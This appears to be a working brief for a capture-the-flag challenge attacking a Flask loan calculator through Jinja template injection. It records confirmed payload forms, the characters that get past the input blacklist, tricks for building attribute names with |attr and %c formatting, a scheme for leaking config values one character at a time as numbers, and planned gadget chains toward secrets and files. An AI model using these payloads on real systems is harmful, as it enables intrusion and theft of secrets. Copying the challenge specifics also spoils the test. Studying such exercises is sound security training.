# Main Brief — ssti_encoding_loan_calculator

## Goal
FLAG{64 hex} hidden on http://ssti_encoding_loan_calculator:80. Jinja SSTI + input regex/blacklist + output must be numeric.

## Access
- /login: creds test:test (HTML comment). Session cookie flask (signed, HttpOnly). Endpoints: /home /profile /loan_details /total_loan_payments /logout

## SSTI (CONFIRMED)
- GET /total_loan_payments?principal=PAYLOAD&payment=1&term=2 (cookie session)
- principal string rendered by Jinja into JSON; output goes through "Computed `loan_principal` value is not a number" check unless numeric.
- WORKING EXFIL: {%print EXPR %} → float-parseable result appears as loan_principal.
- Multiple {%print%} concatenate.

## Input filter (raw value; % decoding occurs BEFORE check)
- BANNED: `.` `_` `[` `]` `{{` `}}`; likely all of `{{`+blacklist. `;`→'Missing parameters' (query sep). `"` `{%` `{#` trigger 500 (parse/syntax errors are fine).
- ALLOWED: `(` `)` `|` `*` `+` `-` `/` `%` `'` `!` `~` `@` `^` `=` `<` `>` `:` `,` `?` `#` `{` `}` space letters digits
- So: NO attribute access (`.x`), NO `[x]`. Use `|attr('%c%c...'|format(...))`.

## Verified primitives
- `{%set x=...%}` top-level OK (in-loop set is scoped → don't rely on it).
- `{%for c in seq%}` OK; `loop` var causes 500 (undefined).
- `config` in context, 29 keys (config|length=29). `config is mapping` → 1.
- `|attr('%c...' | format(ords))` works (read config['FLAG'] → length 0 = absent).
- `'x'|format` OK ('%c' works), `~` concat works, comparisons `==` in if-expr OK.
- `|select('eq',k)|list|length` works (needs |list).
- `config|dictsort|length` = 29. `config|list|length` = 29. `|items`, bare `|select`, `|first|ord`, ord in loop body, `namespace`, `startingwith` → 500.
- {%for k in config%} iterates KEYS (49×29 = "4949...").

## Output constraint
- loan_principal must float-parse; never print raw strings.
- Numeric encoding: for position i print `i*10^10 + ord*100 + t` (base: pos, char, test-bit).

## Current direction
Loop body printing works; {%set%} scoping is the only trap. New plan: value chars via `{%print 1 if c==X else 0%}` chains inside a `{%for%}` — one request can exfil everything numerically.

## Next steps
1. `{%for k,v in config|dictsort%}` or `{%for v in config|values%}` to reach values; test `|values`, `|dictsort` item access forms without dots.
2. Exfil each value: for pos i: `{%print i*10^10+ord*100+t%}` per char-test t.
3. Value char tests: `{%print 1 if c=='%c'|format(70) else 0%}`.
4. Check SECRET_KEY / interesting config values once enumerable; then hunt FLAG (config, os env, files) via subclass gadget `(%c%c|format(95,95))|attr('g'~'lobals')` chains — no dots allowed.